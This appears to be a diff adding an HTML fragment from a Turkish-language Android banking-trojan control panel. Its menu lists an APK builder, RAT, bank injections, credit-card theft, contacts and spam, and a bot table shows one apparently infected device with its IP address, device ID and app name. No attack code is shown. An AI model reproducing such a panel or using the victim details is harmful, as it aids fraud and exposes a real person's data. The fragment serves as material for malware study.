@@ -1,0 +1,24 @@
+BUILDER(APK) fa fa-android fa-2x
+KOMUTLAR fa fa-navicon fa-2x
+KONUMLAR fa fa-map-marker fa-2x
+SPAM fa fa-envelope-open-o fa-2x
+RAT fa fa-microchip fa-2x
+İNJEKSİYONLAR fa fa-bank fa-2x
+CC fa fa-cc fa-2x
+REHBER(LER) fa fa-address-card-o fa-2x 
+İSTATİSTİKLER fa fa-bar-chart fa-2x
+BOT fa fa-bug fa-2x 
+
+BOT 
+
+<form name='callback' method='post'><input type='submit' value='BOT(LAR)A KOMUT EKLE' onclick='getOptSelectIMEI()' name='add_commands' data-toggle='modal' data-target='.modal_command'  style='margin-left:1.5%;' class='btn btn-outline-success  '/><input type='submit' value='BOT(LARI) SİL' name='delete' style='margin-left:5px;' class='btn btn-outline-danger'/><input type='submit' value='FİLTRELE' name='sorting' data-toggle='modal' data-target='.sorting' style='margin-left:5px;' class='btn btn-outline-secondary'/><input type='submit' value='YENİLE' name='refresh' style='margin-left:5px;' class='btn btn-outline-secondary'/><tr class='table_bots' id='table_bots' style='color: #A4A4A4;'>
+				<td><input type=checkbox name=checks[]  id='chk' value=60350:95f29aa24df82b18></input></td>
+				<td><font color='lime'><i class='fa fa-android fa-lg'></i></font> 95f29aa24df82b18</br><font color='aqua'><i class='fa fa-globe fa-lg'></i></font> 176.40.91.246</br><font color='lime'><i class='fa fa-mobile fa-2x'></i></font> GM 8 d</br>(GM8_d)</td>
+				<td>(NO)</br>Indefined</td>
+				<td>9</td>
+				<td>pikacapp</td>
+				<td><a title='tr' style='margin-top: -4%;'><img src='images/country/tr.png' width='20px'/></a></td>
+				<td></td>
+
+
+renkler #36e52b
